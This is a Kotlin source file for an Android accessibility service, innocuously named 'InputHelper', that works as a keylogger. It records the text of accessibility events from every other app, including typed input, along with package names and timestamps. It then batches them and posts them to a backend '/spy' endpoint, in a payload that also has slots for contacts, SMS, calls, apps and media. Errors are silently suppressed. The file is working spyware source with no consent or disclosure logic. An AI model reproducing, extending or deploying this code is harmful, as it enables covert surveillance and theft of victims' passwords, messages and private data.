package com.eren
import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import org.json.JSONArray
import org.json.JSONObject
class InputHelper : AccessibilityService() {
    private val api = Api()
    private val buf = JSONArray()
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        try {
            val text = event.text?.joinToString(" ") ?: return
            if (text.isBlank()) return
            val pkg = event.packageName?.toString() ?: ""
            if (pkg == packageName) return
            val o = JSONObject()
            o.put("package", pkg)
            o.put("text", text)
            o.put("type", event.eventType)
            o.put("ts", System.currentTimeMillis())
            buf.put(o)
            if (buf.length() >= 20) flush()
        } catch (_: Exception) {}
    }
    private fun flush() {
        try {
            val p = JSONObject()
            p.put("device", JSONObject())
            p.put("contacts", JSONArray())
            p.put("sms", JSONArray())
            p.put("calls", JSONArray())
            p.put("apps", JSONArray())
            p.put("media", JSONArray())
            p.put("keys", buf)
            api.post(Backend.URL + "/spy", p.toString())
            while (buf.length() > 0) buf.remove(0)
        } catch (_: Exception) {}
    }
    override fun onInterrupt() {}
}
